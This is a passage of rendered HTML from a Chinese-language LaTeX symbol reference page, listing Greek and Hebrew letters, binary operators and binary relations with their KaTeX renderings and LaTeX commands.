xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϖ</mi></mrow><annotation encoding="application/x-tex">\varpi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">ϖ</span></span></span></span></td><td style="text-align:left">\varpi</td><td style="text-align:left">/paɪ/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">20</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ρ</mi></mrow><annotation encoding="application/x-tex">\rho</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">ρ</span></span></span></span></td><td style="text-align:left">\rho</td><td style="text-align:left">/roʊ/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">21</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϱ</mi></mrow><annotation encoding="application/x-tex">\varrho</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">ϱ</span></span></span></span></td><td style="text-align:left">\varrho</td><td style="text-align:left">/roʊ/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">22</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span></td><td style="text-align:left">\sigma</td><td style="text-align:left">/ˈsɪɡmə/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">23</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ς</mi></mrow><annotation encoding="application/x-tex">\varsigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.52778em;vertical-align:-0.09722em;"></span><span class="mord mathnormal" style="margin-right:0.07986em;">ς</span></span></span></span></td><td style="text-align:left">\varsigma</td><td style="text-align:left">/ˈsɪɡmə/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">24</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>τ</mi></mrow><annotation encoding="application/x-tex">\tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.1132em;">τ</span></span></span></span></td><td style="text-align:left">\tau</td><td style="text-align:left">/taʊ, tɔː/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">25</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>υ</mi></mrow><annotation encoding="application/x-tex">\upsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">υ</span></span></span></span></td><td style="text-align:left">\upsilon</td><td style="text-align:left">/ˈʌpsɪlɒn/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">26</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">ϕ</span></span></span></span></td><td style="text-align:left">\phi</td><td style="text-align:left">/faɪ/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">27</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi></mrow><annotation encoding="application/x-tex">\varphi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">φ</span></span></span></span></td><td style="text-align:left">\varphi</td><td style="text-align:left">/faɪ/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">28</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>χ</mi></mrow><annotation encoding="application/x-tex">\chi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">χ</span></span></span></span></td><td style="text-align:left">\chi</td><td style="text-align:left">/kaɪ/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">29</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ψ</mi></mrow><annotation encoding="application/x-tex">\psi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">ψ</span></span></span></span></td><td style="text-align:left">\psi</td><td style="text-align:left">/psaɪ/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">30</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ω</mi></mrow><annotation encoding="application/x-tex">\omega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">ω</span></span></span></span></td><td style="text-align:left">\omega</td><td style="text-align:left">/oʊˈmeɪɡə/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table><p><strong>注意:</strong> MathJax支持的大写希腊字母有限，如需其他（如大写Alpha），可使用<strong>罗马体</strong>转换，如<code>\mathrm&#123;A&#125;</code>表示大写Alpha：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">A</mi></mrow><annotation encoding="application/x-tex">\mathrm{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord"><span class="mord mathrm">A</span></span></span></span></span>。</p><h3 id="212-希伯来字母-hebrew-alphabet"><a class="markdownIt-Anchor" href="#212-希伯来字母-hebrew-alphabet"></a> 2.1.2 希伯来字母 Hebrew alphabet</h3><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th><th style="text-align:left">英文</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℵ</mi></mrow><annotation encoding="application/x-tex">\aleph</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">ℵ</span></span></span></span></td><td style="text-align:left">\aleph</td><td style="text-align:left">aleph</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℶ</mi></mrow><annotation encoding="application/x-tex">\beth</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord amsrm">ℶ</span></span></span></span></td><td style="text-align:left">\beth</td><td style="text-align:left">beth</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℷ</mi></mrow><annotation encoding="application/x-tex">\gimel</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord amsrm">ℷ</span></span></span></span></td><td style="text-align:left">\gimel</td><td style="text-align:left">gimel</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">ℸ</mi></mrow><annotation encoding="application/x-tex">\daleth</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord amsrm">ℸ</span></span></span></span></td><td style="text-align:left">\daleth</td><td style="text-align:left">daleth</td></tr></tbody></table><h3 id="213-二元运算符-binary-operations"><a class="markdownIt-Anchor" href="#213-二元运算符-binary-operations"></a> 2.1.3 二元运算符 Binary operations</h3><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>+</mo></mrow><annotation encoding="application/x-tex">+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">+</span></span></span></span></td><td style="text-align:left">+</td><td style="text-align:center">20</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∙</mo></mrow><annotation encoding="application/x-tex">\bullet</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord">∙</span></span></span></span></td><td style="text-align:left">\bullet</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo></mrow><annotation encoding="application/x-tex">-</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">−</span></span></span></span></td><td style="text-align:left">-</td><td style="text-align:center">21</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊕</mo></mrow><annotation encoding="application/x-tex">\oplus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">⊕</span></span></span></span></td><td style="text-align:left">\oplus</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>×</mo></mrow><annotation encoding="application/x-tex">\times</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">×</span></span></span></span></td><td style="text-align:left">\times</td><td style="text-align:center">22</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊖</mo></mrow><annotation encoding="application/x-tex">\ominus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">⊖</span></span></span></span></td><td style="text-align:left">\ominus</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>÷</mo></mrow><annotation encoding="application/x-tex">\div</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">÷</span></span></span></span></td><td style="text-align:left">\div</td><td style="text-align:center">23</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊙</mo></mrow><annotation encoding="application/x-tex">\odot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">⊙</span></span></span></span></td><td style="text-align:left">\odot</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>±</mo></mrow><annotation encoding="application/x-tex">\pm</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">±</span></span></span></span></td><td style="text-align:left">\pm</td><td style="text-align:center">24</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊘</mo></mrow><annotation encoding="application/x-tex">\oslash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">⊘</span></span></span></span></td><td style="text-align:left">\oslash</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∓</mo></mrow><annotation encoding="application/x-tex">\mp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">∓</span></span></span></span></td><td style="text-align:left">\mp</td><td style="text-align:center">25</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊗</mo></mrow><annotation encoding="application/x-tex">\otimes</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">⊗</span></span></span></span></td><td style="text-align:left">\otimes</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>◃</mo></mrow><annotation encoding="application/x-tex">\triangleleft</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">◃</span></span></span></span></td><td style="text-align:left">\triangleleft</td><td style="text-align:center">26</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>◯</mo></mrow><annotation encoding="application/x-tex">\bigcirc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">◯</span></span></span></span></td><td style="text-align:left">\bigcirc</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>▹</mo></mrow><annotation encoding="application/x-tex">\triangleright</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">▹</span></span></span></span></td><td style="text-align:left">\triangleright</td><td style="text-align:center">27</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋄</mo></mrow><annotation encoding="application/x-tex">\diamond</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord">⋄</span></span></span></span></td><td style="text-align:left">\diamond</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋅</mo></mrow><annotation encoding="application/x-tex">\cdot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord">⋅</span></span></span></span></td><td style="text-align:left">\cdot</td><td style="text-align:center">28</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊎</mo></mrow><annotation encoding="application/x-tex">\uplus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">⊎</span></span></span></span></td><td style="text-align:left">\uplus</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∖</mo></mrow><annotation encoding="application/x-tex">\setminus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∖</span></span></span></span></td><td style="text-align:left">\setminus</td><td style="text-align:center">29</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>△</mo></mrow><annotation encoding="application/x-tex">\bigtriangleup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">△</span></span></span></span></td><td style="text-align:left">\bigtriangleup</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋆</mo></mrow><annotation encoding="application/x-tex">\star</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">⋆</span></span></span></span></td><td style="text-align:left">\star</td><td style="text-align:center">30</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>▽</mo></mrow><annotation encoding="application/x-tex">\bigtriangledown</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">▽</span></span></span></span></td><td style="text-align:left">\bigtriangledown</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∗</mo></mrow><annotation encoding="application/x-tex">\ast</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span></span></span></span></td><td style="text-align:left">\ast</td><td style="text-align:center">31</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊲</mo></mrow><annotation encoding="application/x-tex">\lhd</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mord amsrm">⊲</span></span></span></span></td><td style="text-align:left">\lhd</td></tr><tr><td style="text-align:center">13</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∪</mo></mrow><annotation encoding="application/x-tex">\cup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∪</span></span></span></span></td><td style="text-align:left">\cup</td><td style="text-align:center">32</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊳</mo></mrow><annotation encoding="application/x-tex">\rhd</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mord amsrm">⊳</span></span></span></span></td><td style="text-align:left">\rhd</td></tr><tr><td style="text-align:center">14</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∩</mo></mrow><annotation encoding="application/x-tex">\cap</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∩</span></span></span></span></td><td style="text-align:left">\cap</td><td style="text-align:center">33</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊴</mo></mrow><annotation encoding="application/x-tex">\unlhd</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord amsrm">⊴</span></span></span></span></td><td style="text-align:left">\unlhd</td></tr><tr><td style="text-align:center">15</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊔</mo></mrow><annotation encoding="application/x-tex">\sqcup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">⊔</span></span></span></span></td><td style="text-align:left">\sqcup</td><td style="text-align:center">34</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊵</mo></mrow><annotation encoding="application/x-tex">\unrhd</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mord amsrm">⊵</span></span></span></span></td><td style="text-align:left">\unrhd</td></tr><tr><td style="text-align:center">16</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊓</mo></mrow><annotation encoding="application/x-tex">\sqcap</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">⊓</span></span></span></span></td><td style="text-align:left">\sqcap</td><td style="text-align:center">35</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⨿</mo></mrow><annotation encoding="application/x-tex">\amalg</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">⨿</span></span></span></span></td><td style="text-align:left">\amalg</td></tr><tr><td style="text-align:center">17</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∨</mo></mrow><annotation encoding="application/x-tex">\vee</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∨</span></span></span></span></td><td style="text-align:left">\vee</td><td style="text-align:center">36</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≀</mo></mrow><annotation encoding="application/x-tex">\wr</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">≀</span></span></span></span></td><td style="text-align:left">\wr</td></tr><tr><td style="text-align:center">18</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∧</mo></mrow><annotation encoding="application/x-tex">\wedge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∧</span></span></span></span></td><td style="text-align:left">\wedge</td><td style="text-align:center">37</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>†</mo></mrow><annotation encoding="application/x-tex">\dagger</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">†</span></span></span></span></td><td style="text-align:left">\dagger</td></tr><tr><td style="text-align:center">19</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∘</mo></mrow><annotation encoding="application/x-tex">\circ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord">∘</span></span></span></span></td><td style="text-align:left">\circ</td><td style="text-align:center">38</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>‡</mo></mrow><annotation encoding="application/x-tex">\ddagger</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">‡</span></span></span></span></td><td style="text-align:left">\ddagger</td></tr></tbody></table><h3 id="214-二元关系符-binary-relations"><a class="markdownIt-Anchor" href="#214-二元关系符-binary-relations"></a> 2.1.4 二元关系符 Binary relations</h3><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo></mrow><annotation encoding="application/x-tex">=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span></span></span></td><td style="text-align:left">=</td><td style="text-align:center">49</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪈</mo></mrow><annotation encoding="application/x-tex">\gneq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel amsrm">⪈</span></span></span></span></td><td style="text-align:left">\gneq</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo mathvariant="normal">≠</mo></mrow><annotation encoding="application/x-tex">\ne</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span></span></span></span></td><td style="text-align:left">\ne</td><td style="text-align:center">50</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≧</mo></mrow><annotation encoding="application/x-tex">\geqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.01166em;vertical-align:-0.25583em;"></span><span class="mrel amsrm">≧</span></span></span></span></td><td style="text-align:left">\geqq</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo mathvariant="normal">≠</mo></mrow><annotation encoding="application/x-tex">\neq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span></span></span></span></td><td style="text-align:left">\neq</td><td style="text-align:center">51</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≱</mo></mrow><annotation encoding="application/x-tex">\ngeq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mrel 